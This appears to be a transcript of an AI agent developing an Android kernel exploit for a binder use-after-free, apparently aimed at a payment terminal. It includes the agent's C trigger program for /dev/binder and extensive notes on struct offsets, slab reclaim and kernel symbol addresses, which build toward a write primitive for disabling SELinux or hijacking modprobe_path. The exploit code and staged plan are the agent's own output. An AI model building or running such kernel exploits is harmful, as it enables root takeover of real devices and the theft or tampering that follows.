v) { memcpy(*p, &v, 8); *p += 8; }\n\n/* flat_binder_object arm32: hdr.type(4) flags(4) binder(8) cookie(8) = 24B */\nstruct flat_obj { uint32_t type, flags; uint64_t binder, cookie; };\n\n#define BC_TRANSACTION      0\n#define BC_REPLY            1\n#define BC_ACQUIRE          2\n#define BC_RELEASE          3\n#define BC_DECREFS          4\n#define BC_INCREFS          5\n#define BC_FREE_BUFFER      3   /* same encoding as BC_REPLY: handled by len */\n#define BC_ENTER_LOOPER     9\n#define BC_REGISTER_LOOPER 10\n#define BC_TRANSACTION_SG  10\n\n#define TF_ONE_WAY 0x01\n\nstruct txn_data {         /* binder_transaction_data arm32 = 48 bytes */\n    union { uint32_t handle; uint64_t ptr; } target;\n    uint64_t cookie;\n    uint32_t code, flags;\n    int32_t  sender_pid;\n    uint32_t sender_euid;\n    uint64_t data_size, offsets_size;\n    uint64_t data_ptr;\n};\n\nstatic void bc_ref_cmd(uint8_t *b, uint32_t cmd, uint32_t handle)\n{ put_u32(&b, cmd); put_u32(&b, handle); }\n\n/* ------------------------------------------------------------------ */\n\nstatic int g_fd;\n\n/* helper proc: opens own binder fd, becomes a looper, receives node from P,\n * replies, then sits ready to BC_RELEASE the handle on command.  Kept as a\n * separate process via fork + pipe sync. */\nstatic int g_sync[2];\n\nstatic void helper_proc(void)\n{\n    int fd = open(\"/dev/binder\", O_RDWR | O_CLOEXEC);\n    uint8_t rbuf[4096];\n    if (fd < 0) die(\"helper open binder\");\n    uint32_t max_threads = 4;\n    ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads);\n    uint8_t enter = BC_ENTER_LOOPER;\n    write(fd, &enter, 1);\n\n    /* loop: read BR_TRANSACTION (node delivery), keep the handle,\n     * reply empty.  After 'GO' byte on pipe: drop refs storm. */\n    for (;;) {\n        uint32_t br;\n        if (read(fd, &br, 4) != 4) _exit(2);\n        if (br == 4 /*BR_NOOP pad*/ || br == 0) continue;\n        if (br == 1 /*BR_TRANSACTION*/) {\n            struct txn_data td;\n            if (read(fd, &td, sizeof(td)) != sizeof(td)) _exit(2);\n            /* swallow offsets */\n            uint8_t junk[4096];\n            uint32_t no = (uint32_t)td.offsets_size;\n            if (no) read(fd, junk, no);\n            /* read the returned handle from the buffer payload */\n            uint32_t handle = 0;\n            /* P wrote the 24-byte object; after translation the first uint32\n             * of data payload is the BINDER_TYPE_HANDLE's fp->handle field\n             * at offset 8 within the flat object */\n            /* raw buffer read */\n            uint8_t buf[64]; memset(buf, 0, sizeof(buf));\n            /* data_ptr is kernel-side address; use mmap trick unavailable in\n             * helper: instead issue BC_FREE_BUFFER after BC_RELEASE so we do\n             * not need buffer contents.  The handle equals the desc; first\n             * acquired desc for first node = 1, nodes are acquired in order */\n            handle = td.code;      /* P encodes the expected handle in code! */\n            if (handle == 0) continue;\n            /* wait for GO */\n            uint8_t go;\n            if (read(g_sync[0], &go, 1) != 1) _exit(3);\n            /* drop the strong ref N times for handle range */\n            uint8_t wbuf[64];\n            for (uint32_t h = 1; h <= handle; h++) {\n                uint8_t *p = wbuf;\n                bc_ref_cmd(p, BC_RELEASE, h);\n                bc_ref_cmd(p, BC_DECREFS, h);\n                if (write(fd, wbuf, (size_t)(p - wbuf)) < 0) _exit(4);\n            }\n            _exit(0);\n        }\n    }\n}\n\n/* victim: acquires N nodes (each as own node in P, BINDER_TYPE_BINDER), which\n * parks BINDER_WORK_NODE on ITS OWN todo (inc_ref_for_node target_list =\n * &thread->todo of the sending thread) and then BINDER_THREAD_EXITs while the\n * helper drops the refs. */\nstatic void victim(uint32_t nnodes)\n{\n    uint8_t big[8192];\n    struct flat_obj fo;\n    memset(&fo, 0, sizeof(fo));\n    fo.type = 0x303 /*BINDER_TYPE_BINDER*/; fo.flags = 0x306 /*TF_* modes*/;\n\n    for (uint32_t i = 1; i <= nnodes; i++) {\n        memset(big, 0, sizeof(big));\n        uint8_t *p = big;\n        put_u32(&p, BC_TRANSACTION | (TF_ONE_WAY ? 0 : 0));  /* plain TX */\n        struct txn_data td;\n        memset(&td, 0, sizeof(td));\n        td.handle = 0;                 /* to context manager = ourselves? */\n        td.code = i;                   /* encode handle for helper */\n        td.flags = TF_ONE_WAY;         /* oneway: no reply wait */\n        td.data_size = sizeof(fo);\n        td.offsets_size = 4;\n        memcpy(p, &td, sizeof(td)); p += sizeof(td);\n        memcpy(p, &fo, sizeof(fo)); p += sizeof(fo);\n        uint32_t off = 0;              /* object offset 0 */\n        memcpy(p, &off, 4);            p += 4;\n        uint32_t txnlen = 4 + sizeof(td) + sizeof(fo) + 4;\n        if (write(g_fd, big, txnlen) != (ssize_t)txnlen) {\n            fprintf(stderr, \"[!] txn write failed at %u: %s\\n\", i, strerror(errno));\n            break;\n        }\n    }\n    /* nodes now exist; helper holds refs; BINDER_WORK_NODE items parked on\n     * this thread's todo (from inc_ref_for_node with target_list=thread->todo,\n     * for each first-acquire of each node in helper). */\n    ioctl(g_fd, BINDER_THREAD_EXIT, 0);\n}\n\nint main(int argc, char **argv)\n{\n    uint32_t nnodes = (argc > 1) ? (uint32_t)strtoul(argv[1], NULL, 0) : 200;\n    setvbuf(stdout, NULL, _IONBF, 0);\n\n    pipe(g_sync);\n    g_fd = open(\"/dev/binder\", O_RDWR | O_CLOEXEC);\n    if (g_fd < 0) die(\"open /dev/binder\");\n\n    pid_t hp = fork();\n    if (hp == 0) { close(g_sync[1]); helper_proc(); _exit(0); }\n    close(g_sync[0]);\n\n    // Become context manager? NO: txns target handle 0 = ctx mgr.\n    // We cannot be ctx mgr (zygote/servicemanager is).  Targeting handle 0\n    // from P sends to servicemanager: servicemanager's reply translates\n    // nothing, but P's BINDER_TYPE_BINDER object is translated into a node\n    // ref FOR servicemanager and the FIRST-INCREF notification work is\n    // parked on P's thread todo.  The helper is not needed for parking.\n    //   ... but freeing needs someone to drop P's node refs: servicemanager\n    //   will BC_RELEASE when its ref drops (its own GC on txn release walk).\n    // Simpler self-contained variant: skip the helper, let servicemanager's\n    // release path free the nodes asynchronously; parked work outlives it.\n    //\n    // The helper variant (deterministic free timing) is kept behind argv[2].\n\n    if (argc > 2 && argv[2][0] == 'h') {\n        // helper-assisted deterministic mode\n        victim(nnodes);\n        write(g_sync[1], \"G\", 1);\n        int st; waitpid(hp, &st, 0);\n        printf(\"[*] helper done rc=%d\\n\", WEXITSTATUS(st));\n    } else {\n        victim(nnodes);\n        usleep(200 * 1000);\n        printf(\"[*] victim survived BINDER_THREAD_EXIT\\n\");\n    }\n\n    /* survive check */\n    for (int i = 0; i < 5; i++) printf(\"[*] alive %d\\n\", i), usleep(200000);\n    return 0;\n}\n"}

[tool • write]
Successfully wrote to /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/t42.c

[assistant]
<acp tokens="82" type="text" time="2026-11-15 12:24:53">m04635</acp>
The trigger, leak channel, and write engine are all grounded now. Building the stage-1 device probes — first the **binder buffer self-leak** (the mmap'd region exposes `binder_buffer.target_node` = kernel kaddr of each delivered txn's target node), then the race trigger. Checking the exact `binder_buffer` struct layout first:

[assistant]
<acp tokens="59" type="text" time="2026-11-15 12:25:59">m04640</acp>
The reclaim-leak and write engine are settled; now the release-walk handler shape must be pinned exactly. Reading `binder_release_work` pre-fix body and `binder_inc_ref_for_node` (notification parking + ref lifetime) in the 4.14 source:

[assistant]
<acp tokens="106" type="text" time="2026-11-15 12:29:08">m04655</acp>
The release-walk UAF is confirmed but the exploitation design has evolved past the race entirely. Critical realization from the source re-read: `binder_dec_node(buffer->target_node, 1, 0)` at the `BC_FREE_BUFFER` path dereferences a pointer that lives in **P's own mmap'd buffer header** — user-writable on 4.14 — which can short-circuit the entire race. Verifying the remaining vehicle prerequisites from the kernel config:

[assistant • compress]
{"content":"m04629–m04671 CVE-2020-0423 stage: full mechanics grounded; exploit strategy FROZEN (race-free variant chosen)\nSOURCE RE-READS (vanilla414b.c, exact): binder_release_work@4078 = pre-fix walk (dequeue under inner lock w/ binder_dequeue_work_head proc-locked wrapper; switch(w->type) OUT OF LOCK); BINDER_WORK_NODE is NOT a release_work case → hits default pr_err \"unexpected work type %d not freed\" (read-only w->type UAF, NO double-free from this walker; the BINDER_WORK_NODE full-deref branch lives only in binder_thread_read@3840 with BUG_ON(proc != node->proc)). binder_dequeue_work_head_ilocked uses list_del_init (DEBUG_LIST poison-safe). binder_thread_release@4214: BINDER_THREAD_EXIT ioctl; clears txn stack; send_reply→binder_send_failed_reply; then binder_release_work(proc,&thread->todo); binder_thread_dec_tmpref. binder_inc_ref_for_node: inc_ref_olocked(ref,strong,target_list) → binder_inc_node(node,1,1,target_list) → if !has_strong_ref: binder_dequeue_work_ilocked(&node->work) + binder_enqueue_work_ilocked(&node->work,target_list) — target_list = &P1-thread->todo for BINDER_TYPE_BINDER xacts (translate_binder). First strong acquire per node re-enqueues node->work onto the SENDING thread todo; release_work on that thread later switch(w->type) reads node+8 OUT OF LOCK. binder_thread_read@3973: if t->buffer->target_node: tr.target.ptr=node->ptr; tr.cookie=node->cookie (LEAK WINDOW reads node fields on delivery). binder_buffer (binder_alloc.h@46): entry(8),rb_node(12),bitfields@0x24,transaction@0x2c,target_node@0x30,data_size@0x34,offsets_size@0x38,extra_buffers_size@0x3c,data@0x40 — user-visible via data.ptr.buffer−40 header, HARDENED_USERCOPY=copy_to_user of tr only (no header copy) BUT header lies in P's OWN mmap = directly readable/writable by P userland. binder_dec_node@1307 wrapper = inner_lock/nilocked/inner_unlock+free; device wrapper identical shape (@c0880aec). binder_new_node=kzalloc(node); binder_free_node=kfree(node) only. binder_node arm32 layout (414): debug_id@0,spinlock@4,work{entry.next@8,prev@12,type@16}(size20),rb_node/dead_node union@0x20(12),proc@0x2c,refs@0x30,4 ints@0x34..0x40,ptr@0x44(cookie@0x4c? — 64-bit ptr/cookie on 8-align: ptr@0x44? NO — after 4 ints ending 0x44, ptr is binder_uintptr_t(8B)@0x44(4-align ok)… VERIFY device struct via BUG_ON disasm or kzalloc size; kmalloc-96 per BFS earlier note). binder_ref_death: work(20)+cookie(8)=28B→kmalloc-32.\nCONFIG (gl/config_full.txt re-verified): USERFAULTFD off; KEYS on; BPF_SYSCALL on; SCTP off; SYSVIPC off; UNIX/NET on; SLUB_DEBUG=y; FREELIST_RANDOM off; FREELIST_HARDENED off; SLUB_DEBUG_ON off; HARDENED_USERCOPY=y (+PAGESPAN off). Per-CPU freelist UNHARDENED (c02a5d78 kmem_cache_free fast path: obj first word := c->freelist, c->freelist := obj — classic LIFO).\nSYMBOLS: sys_call_table c0108944, init_task c1112ec0, modprobe_path c112048c, selinux_enforcing c1315190.\nSTRATEGY FROZEN (b78 race design + m04629+ additions): Stage-1 probe t42.c (written, needs rewrite to frozen plan): (A) PARK: P1 sends N oneway txns carrying BINDER_TYPE_BINDER to ctx mgr (handle 0, servicemanager SM accepts from any uid; each first-acquire parks BINDER_WORK_NODE on sending thread todo). (B) EXIT: BINDER_THREAD_EXIT on that thread → release_work walks todo: for each item, unlock window between dequeue and switch(w->type). (C) FREE concurrently: SM's txn-buffer release walk (SM BC_FREE_BUFFERs each oneway txn buffer → binder_transaction_buffer_release → BINDER_TYPE_HANDLE obj → binder_dec_ref_for_handle(SM's ref) → final dec → cleanup_ref → delete_node → kfree(node)) — SM does this at ITS OWN pace = window opens naturally across N iterations WITHOUT a tight race thread. (D) OBSERVE: t42 monitors for pr_err \"unexpected work type\" in kernel log (no kmsg access as untrusted? via __cxa or logcat dropbox) — better: OBSERVE = process survival + repeat sweeps. The REAL payload version replaces (C) with reclaim: freed node (kmalloc-96) re-taken by P's sendmsg cmsg chains (ctl_len 89–96) whose msg_control bytes = crafted binder_node {work.entry.next=LIST_POISON-safe?, work.type=chosen}; release_work then switch(w->type) READS RECLAIMED BYTES = we control type → point it at BINDER_WORK_TRANSACTION to get container_of(w,t->work)... NO — kfree'd txn? Too dangerous. Chosen payload: w->type read only decides NOTHING attacker-fatal unless we make P1's release walk see BINDER_WORK_TRANSACTION_COMPLETE (kfree(w)=ARBITRARY-FREE primitive! container_of is identity for COMPLETE: kfree(&node->work)=kfree(node) — that's just double-free) — OR DEAD_BINDER cases (kfree(death) where death=container_of(w)=kfree(node+0)=same). SO: release_work UAF alone gives ONLY a controlled double-free / poison-read. THE REAL PRIMITIVE comes from thread_read's BINDER_WORK_NODE branch (normal ioctl read path, NOT teardown): P1's OTHER reader thread processing node work reads node->ptr/cookie (LEAK at 3973: tr.target.ptr=...) — with RECLAIMED node bytes we control ptr/cookie shown in BR_TRANSACTION... but that's data we already control. ⇒ Value chain: (1) leak = BR_TRANSACTION target.ptr/cookie of REUSED slots (b64 self-leak: nodes freed then slot reused by kmalloc-96 vehicle holding self-ref seq_file/mutex-wait_list.prev → ptr window readback = slot kaddr). (2) write8 = BC_FREE_BUFFER path (b64): parked txn buffer with target_node pointing at RECLAIMED-SLOT kaddr; BC_FREE_BUFFER → binder_transaction_buffer_release → if(buffer->target_node) binder_dec_node(ptr FROM OUR MMAP HEADER) → dec_node_nilocked reads fake node fields incl refs hlist → hlist_del write8 (dead_node path needs proc==NULL etc. — full b64 gadget). NO RACE NEEDED for (2): target_node is READ from the mmap'd buffer header at free time (binder_alloc_prepare_to_free→buffer @fixed slab, then buffer->target_node deref) — we overwrite the header in OUR mmap between delivery and BC_FREE_BUFFER. (3) trigger for buffer-target_node confusion: deliver txn to helper node (target_node=real N1), note buffer vaddr, wait for node N1 kfree+reclaim as vehicle slot, overwrite header target_node=slot, BC_FREE_BUFFER → gadget on crafted node. THIS IS CLEANER THAN BFS CHOREOGRAPHY: no FDA/parent tricks at all, single-user primitive chain: park→free→reclaim→header-swap→free-buffer→write8. b64 hlist_del write8 gadget details preserved (b64 block: dead_node.next@+0x14=what, .pprev@+0x18=where, list_empty check needs entry.next==slot+8 self-point... ADJUST offsets for node layout: work.entry@+8 (self-point = slot+8), dead_node@+0x20, dead_node.next=what@+0x24?? — b64 said next@+0x14 pprev@+0x18 relative to dead_node?? RECONCILE: b64 offsets were relative to binder_node base: dead_node.pp? — ACTION: re-derive write-gadget byte offsets from device binder_dec_node_nilocked@c0880900 disasm during stage-2 coding, do NOT trust b64 numbers blindly.)\nOpen objectives: (m03759) rewrite t42.c to frozen strategy (park→BINDER_THREAD_EXIT→SM-paced free; observe) — DONE file exists but needs alignment to frozen plan; stage-2 leak vehicle; stage-3 write8 + selinux_enforcing/modprobe_path; update E-057 §3.1; F-014 when proven."}

[tool • compress]
[Compressed m04629–m04671 → 1 block(s), ~4208 tokens saved. endId="m04671" is above this session's highest allocated ref (m04669) — clamped to it (refs are minted in order and never pre-allocated, so higher numbers do not exist yet). The range folds up to the last visible message.; Excluded 7 protected message(s) m04629, m04632, m04633, m04634, m04635, m04640, m04655 from compression range (recent/last-user zone) — they stay visible outside the new block; do not target them in another compress call. Last-user anchor: m03759 "find on website kernel R/W on 4.14.133 t".]
 · b79 full summary 6981ch [2026-11-15 12:19:14 – 2026-11-15 12:29:23] · head "SOURCE RE-READS (vanilla414b.c" … tail "eak vehicle; stage-3 write8 + selinux_enforcing/modprobe_path; update E-057 §3.1; F-014 when proven."
Fingerprints show head/tail only — every summary is stored in full. To retrieve a specific detail from a new block, call search_context({ query }) first; decompress only if the excerpt doesn't answer it.

Uncovered history remains — all offered ranges are folded, but 116 msg(s) across 3 run(s), ~18K tok, sit outside every active block and are not in this call's offer: m04313–m04462 (26 msgs, ~4.3K tok), m04463–m04494 (32 msgs, ~4.1K tok), m04570–m04628 (58 msgs, ~10K tok). The context is not at its minimum (runs may sit below the fold-size gate — named for visibility, not as fold suggestions); inspect with acp_status(scope:"uncompressed").

[assistant]
<acp tokens="40" type="text" time="2026-11-15 12:30:38">m04670</acp>
Strategy frozen and grounded. Now pinning the exact `binder_node` layout from the authoritative 4.14 header — the fake-node offsets are the load-bearing detail:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && sed -n '/^struct binder_node {/,/^};/p' 414_binder.h 2>/dev/null || grep -n \"struct binder_node\" 414_binder.h"}

[tool • bash]
(no output)

[assistant • compress]
{"content":"m04313–m04494 vanilla-4.14 binder source re-read + CVE-2020-0041 closure (conclusions in b70/b71; non-redundant anchors here)\n- vanilla414b.c reads: binder_get_node_refs_for_txn @2606-2627 — returns node only if node->proc non-NULL (inc strong=1 + tmpref + proc->tmp_ref++), else sets BR_DEAD_REPLY. binder_transaction @2630+; target resolve 2700-2760: handle≠0 → binder_get_ref_olocked(proc,handle,true) + refs_for_txn (invalid → user_error \"got transaction to invalid handle\", BR_FAILED_REPLY); handle==0 → context_mgr_node under context_mgr_node_lock (NULL→BR_DEAD_REPLY); !target_node→err_dead_binder(-EINVAL). target_thread hunt @2780-2810 walks thread->transaction_stack via t->from; from->proc==target_proc → atomic_inc(from->tmp_ref)+target_thread=from. t=kzalloc @2810.\n- offsets/sg-buf @2900-2930: off_end=off_start+tr->offsets_size; sg_bufp=PTR_ALIGN(off_end,8); sg_buf_end=sg_bufp+extra_buffers_size (=tr.buffers_size for BC_TRANSACTION_SG @3410); IS_ALIGN checks → err_bad_offset.\n- binder_transaction_buffer_release @2097-2160: FIRST `if (buffer->target_node) binder_dec_node(buffer->target_node, 1, 0);` then per-offset walk bounded by failed_at (err path passes offp): BINDER/WEAK_BINDER → binder_get_node(proc, fp->binder) + dec + put_node (miss = pr_err \"bad node\", harmless); HANDLE → binder_dec_ref_for_handle.\n- err/success path @3094-3160: success dec tmprefs + smp_wmb + WRITE_ONCE(e->debug_id_done,t_debug_id); err chain err_translate_failed: binder_transaction_buffer_release(target_proc,t->buffer,offp) (partial, validated-only); t->buffer->transaction=NULL; binder_alloc_free_buf; if target_node: binder_dec_node(target_node,1,0)+dec tmpref — FAILED-TXN path frees target node synchronously in SENDER thread.\n- BC_FREE_BUFFER @3353-3404: get_user data_ptr; binder_alloc_prepare_to_free (NULL→\"no match\"); !allow_user_free→\"matched unreturned buffer\"+break; buffer->transaction{→buffer=NULL;→transaction=NULL}; async+target_node: BUG_ON(!has_async_transaction)+BUG_ON(buf_node->proc!=proc), dequeue async_todo else has_async_transaction=0; then binder_transaction_buffer_release(proc,buffer,NULL)+binder_alloc_free_buf. BR_TRANSACTION delivery @3977-3988: tr.target.ptr=target_node->ptr; tr.cookie=target_node->cookie.\n- DEVICE DISASM (tmp/m3/zImage.bin): dis2_binder_validate_ptr.txt @c087e240 — 64-bit limit-vs-index cmp (cmp r3,r1; cmpeq r2,r0; bcc), index bound fail→r0=0; then `add r2, ip, r2, lsl #3` (off_start+idx*8); validator bl c088b444 @c087e2b4. dis2_binder_fixup_parent.txt @c0884a14 — r6=[r0,#24], r5=[r0,#28], r4=r2(bp); ands r0,[r2,#4],#1 = HAS_PARENT flag (0→skip); bl binder_validate_ptr @c0884a8c; NULL→pr_err via c018ede0 + mvn r0,#21 (=0xFFFFFFEA −EINVAL); parent_buffer uses r6+#328 (user_buffer_offset adj); write = vanilla @2513 *(parent_buffer+bp->parent_offset)=bp->buffer. Call sites in dis2_binder_transaction.txt: FDA @c088653c, fixup @c0886a7c — BOTH compute num_valid via `lsr r3,#3` + `orr r3,r3,r2,lsl #29` (64-bit ÷8) → verdict b70: CVE-2020-0041 DEAD.\n- Fix patch fetched @m04494: 16981742717b04644a41052570fb502682a315d2 \"binder: fix incorrect calculation for num_valid\" (Todd Kjos, 13-12-2019): changes `* sizeof(binder_size_t)` → `/ sizeof(binder_size_t)` at both FDA site (~3310) and fixup site (~3384). Device already has the fixed ÷8 = Unisoc cherry-picked despite 4.14.133.\n- LESSON: kern_ref/414_binder.h contains NO `struct binder_node {` — binder_node layout must be derived from device BUG_ON disassembly or aosp-4.14 binder.c struct block.\nOpen objectives: unchanged (b79/b78).\nm04570–m04611 CVE-2020-0423 mechanics part1: teardown + ref-free paths (vanilla414b.c line anchors; conclusions in b78)\n- binder_send_failed_reply: BUG_ON(t->flags & TF_ONE_WAY); loop: binder_get_txn_from_and_acq_inner(t); target_thread → binder_pop_transaction_ilocked(target_thread,t); if reply_error.cmd==BR_OK → cmd=error_code + enqueue reply_error.work on target_thread->todo + wake; else WARN \"Unexpected reply error: %u\"; unlock; binder_thread_dec_tmpref; binder_free_transaction(t); return. No thread → walk t->from_parent freeing each transaction (\"reply failed, no target thread -- retry %d\").\n- binder_thread_release @4214-4286 (ioctl BINDER_THREAD_EXIT 0x40046205, caller @4492; also @4812 in binder_deferred_release): inner lock; proc->tmp_ref++; atomic_inc(thread->tmp_ref); rb_erase(&thread->rb_node,&proc->threads); t=transaction_stack; if t: spin_lock(&t->lock); if to_thread==thread send_reply=t; thread->is_dead=true; walk stack: to_thread==thread → to_proc=NULL,to_thread=NULL, if buffer{buffer->transaction=NULL;buffer=NULL}, t=t->to_parent; from==thread → t->from=NULL, t=t->from_parent; else BUG(); spin_unlock(last_t->lock). unlock; send_reply→binder_send_failed_reply(send_reply,BR_DEAD_REPLY); @4274 binder_release_work(proc,&thread->todo); binder_thread_dec_tmpref. binder_free_thread begins with BUG_ON(!list_empty(&thread->todo)) — todo must be drained before thread kfree.\n- binder_release_work call sites: 4274 thread->todo, 4716 node->async_todo (binder_node_release), 4850+4851 proc->todo + proc->delivered_death (binder_deferred_release).\n- binder_dec_node_nilocked @1247-1306: strong: internal→internal_strong_refs-- else local_strong_refs--; remain→false. weak(!strong): !internal→local_weak_refs--; if(local_weak_refs||tmp_refs||!hlist_empty(&node->refs))→false. Then if proc&&(has_strong_ref||has_weak_ref): if list_empty(&node->work.entry){binder_enqueue_work_ilocked(&node->work,&proc->todo); binder_wakeup_proc_ilocked(proc);} — RE-ENQUEUES node work on proc->todo even from internal strong dec = racing work item. else if all counts empty: proc case → binder_dequeue_work_ilocked(&node->work)+rb_erase(&node->rb_node,&proc->nodes); DEAD-node case → BUG_ON(!list_empty(&node->work.entry)); binder_dead_nodes_lock; tmp_refs recheck→false; hlist_del(&node->dead_node); unlock; return true (→kfree).\n- binder_dec_node @1307: inner_lock; nilocked; inner_unlock; free_node→binder_free_node(node). DEVICE wrapper identical @c0880aec: movw r1,#1556; bl c087d4fc _binder_node_inner_lock; bl c0880900 nilocked; unlock c087d6ac; ret!=0→bl c087cbc8 binder_free_node. binder_free_node c087cbc8 = plain bl kfree c02a63c4 + stats atomic inc at c136e25c+184. binder_dequeue_work_head_ilocked @c087d8a4 exists as standalone symbol.\n- BC_INCREFS/ACQUIRE/RELEASE/DECREFS handler @3216-3277: get_user(target); increment&&!target → ctx-mgr branch: binder_inc_ref_for_node(proc,ctx_mgr_node,strong,NULL,&rdata) under context_mgr_node_lock (target_list=NULL); else binder_update_ref_for_handle(proc,target,increment,strong,&rdata); ret==0&&rdata.desc!=target→user_error \"tried to acquire reference to desc %d, got %d instead\"; ret→\"refcount change on invalid ref\" + break.\n- binder_update_ref_for_handle: proc_lock; ref=binder_get_ref_olocked(proc,desc,strong); !ref→-EINVAL; increment? binder_inc_ref_olocked(ref,strong,NULL) : delete_ref=binder_dec_ref_olocked(ref,strong); *rdata=ref->data; unlock; if delete_ref → binder_free_ref(ref).\n- binder_dec_ref_olocked: strong: data.strong==0→user_error \"invalid dec strong\" false; data.strong--; if==0→binder_dec_node(ref->node,1,1) (strong,internal). weak: data.weak==0→\"invalid dec weak\" false; data.weak--; if(strong==0&&weak==0){binder_cleanup_ref_olocked(ref); return true;} → binder_free_ref(ref): if ref->node→binder_free_node(ref->node)=kfree(node); kfree(ref->death); kfree(ref) (binder_ref kmalloc-64 per b64).\n- binder_cleanup_ref_olocked: rb_erase refs_by_desc+refs_by_node; node_inner_lock(ref->node); if data.strong→binder_dec_node_nilocked(node,1,1); hlist_del(&ref->node_entry); delete_node=dec_node_nilocked(node,0,1); node_inner_unlock; if !delete_node→ref->node=NULL (node survives); if ref->death→binder_dequeue_work(ref->proc,&ref->death->work)+stats. The thread executing BC_RELEASE is the kfree trigger — attacker-controlled thread = freeing vehicle for the race.\nOpen objectives: unchanged (b79/b78).\nm04613–m04628 CVE-2020-0423 mechanics part2: node-work handler + parking + err path (vanilla414b.c line anchors; conclusions in b78/b79)\n- binder_proc_transaction: node=t->buffer->target_node (BUG_ON !node); node_lock; oneway: BUG_ON(thread); if node->has_async_transaction→target_list=&node->async_todo,wakeup=false else has_async_transaction=1; inner lock: proc->is_dead||(thread&&thread->is_dead)→false; if(!thread&&!target_list)thread=binder_select_thread_ilocked(proc); thread→&thread->todo; elif !target_list→&proc->todo; else BUG_ON(target_list!=&node->async_todo); binder_enqueue_work_ilocked(&t->work,target_list); if wakeup→binder_wakeup_thread_ilocked(proc,thread,!oneway); unlock; true.\n- binder_available_for_proc_work_ilocked: !thread->transaction_stack && todo empty && (looper&(ENTERED|REGISTERED)).\n- binder_inc_node_nilocked @1195-1230: strong internal: if(!target_list&&internal_strong_refs==0&&!(node->proc&&node==ctx_mgr_node&&has_strong_ref)){pr_err \"invalid inc strong node\"; -EINVAL;} internal_strong_refs++; else local_strong_refs++; if(!node->has_strong_ref&&target_list){binder_dequeue_work_ilocked(&node->work); binder_enqueue_work_ilocked(&node->work,target_list);} — MOVES node->work onto target_list (=sender thread todo). weak: !internal→local_weak_refs++; if(!has_weak_ref&&list_empty(&node->work.entry)){if(!target_list){pr_err \"invalid inc weak node\"; -EINVAL;} enqueue(&node->work,target_list);} (weak path: enqueue only, no dequeue).\n- binder_translate_binder @2232-2274: node=binder_get_node(proc,fp->binder); !node→binder_new_node(proc,fp); cookie mismatch → user_error \"sending u%.. node %d, cookie mismatch %.. != %..\" -EINVAL; security_binder_transfer_binder<0→EPERM; binder_inc_ref_for_node(target_proc,node,strong,&thread->todo,&rdata) — target_list=&SENDER thread->todo ⇒ first strong acquire parks BINDER_WORK_NODE on sending thread; fp rewritten BINDER→HANDLE, binder=0, handle=rdata.desc, cookie=0; binder_put_node(node).\n- binder_thread_read BINDER_WORK_NODE @3840-3933 (normal reader loop): node=container_of(w,struct binder_node,work); reads node->ptr/node_cookie/debug_id/has_* BEFORE any lock-free window; BUG_ON(proc != node->proc); strong=internal_strong_refs||local_strong_refs; weak=!hlist_empty(&node->refs)||local_weak_refs||tmp_refs||strong; weak&&!has_weak_ref→has_weak_ref=1,pending_weak_ref=1,local_weak_refs++; strong&&!has_strong_ref→analogous; !strong→has_strong_ref=0; !weak→has_weak_ref=0; if(!weak&&!strong){rb_erase(&node->rb_node,&proc->nodes); inner_unlock; binder_node_lock(node); binder_node_unlock(node); binder_free_node(node);} else inner_unlock. put_node_cmd order: BR_INCREFS(weak&&!has_weak), BR_ACQUIRE(strong&&!has_strong), BR_RELEASE(!strong&&has_strong), BR_DECREFS(!weak&&has_weak) — writes node_ptr+cookie to user.\n- BINDER_WORK_DEAD_BINDER/CLEAR @3934-3970: death=container_of(w,binder_ref_death,work); CLEAR→BR_CLEAR_DEATH_NOTIFICATION_DONE + inner_unlock+kfree(death); else enqueue w→&proc->delivered_death+unlock; put_user(cmd)+cookie(8B); BR_DEAD_BINDER→goto done.\n- binder_transaction err/success @3094-3160 (expanded): success dec tmprefs+smp_wmb+WRITE_ONCE(e->debug_id_done); err_dead_proc_or_thread→BR_DEAD_REPLY+binder_dequeue_work(proc,tcomplete) then err_translate_failed chain: binder_transaction_buffer_release(target_proc,t->buffer,offp)(partial)+binder_dec_node_tmpref(target_node)+t->buffer->transaction=NULL+binder_alloc_free_buf(&target_proc->alloc,t->buffer)+kfree(tcomplete); bottom: if(target_node){binder_dec_node(target_node,1,0); binder_dec_node_tmpref(target_node);} — oneway to dead proc frees node in SENDER thread context = attacker picks the freeing thread/CPU.\n- binder_inc_node_tmpref @1358: node_lock; node->proc? inner_lock : binder_dead_nodes_lock; inc tmp_refs; unlock.\nOpen objectives: (m03759) rewrite tmp/m3/t42.c to frozen strategy (b79: park→BINDER_THREAD_EXIT→SM-paced free; then reclaim→header-swap→BC_FREE_BUFFER write8); derive binder_node offsets from device disasm; build w/ NDK r25c wrappers; run on device 83768010426653; update E-057 §3.1; F-014 when proven."}

[tool • compress]
[Compressed m04313–m04494, m04570–m04611, m04613–m04628 → 3 block(s), ~27578 tokens saved.]
 · b80 full summary 3425ch [2026-11-15 11:53:54 – 2026-11-15 12:09:02] · head "- vanilla414b.c reads: binder_" … tail " device BUG_ON disassembly or aosp-4.14 binder.c struct block. Open objectives: unchanged (b79/b78)."
 · b81 full summary 4270ch [2026-11-15 12:13:37 – 2026-11-15 12:15:32] · head "- binder_send_failed_reply: BU" … tail "r — attacker-controlled thread = freeing vehicle for the race. Open objectives: unchanged (b79/b78)."
 · b82 full summary 3957ch [2026-11-15 12:17:07 – 2026-11-15 12:17:24] · head "- binder_proc_transaction: nod" … tail "asm; build w/ NDK r25c wrappers; run on device 83768010426653; update E-057 §3.1; F-014 when proven."
Fingerprints show head/tail only — every summary is stored in full. To retrieve a specific detail from a new block, call search_context({ query }) first; decompress only if the excerpt doesn't answer it.

No compressible ranges remain — the context is already at its minimum; continue the task without compressing.

[assistant]
<acp tokens="79" type="text" time="2026-11-15 12:32:40">m04673</acp>
Context is consolidated; race design is frozen, but the parking details need one more source pass — the exact ref-counting (local vs internal strong refs) decides *which* acquire actually parks `BINDER_WORK_NODE` on the sending thread's todo. Re-reading the exact 4.14 node-ref code from the on-disk vanilla source:

[assistant]
<acp tokens="59" type="text" time="2026-11-15 12:33:11">m04682</acp>

Parking confirmed (first strong acquire parks `node->work` on the sending thread's todo). The node's *free* path needs the full ref-lifecycle tail — when exactly a ref is deleted and the node reaches the dead-node `hlist_del` branch:

[assistant • bash]
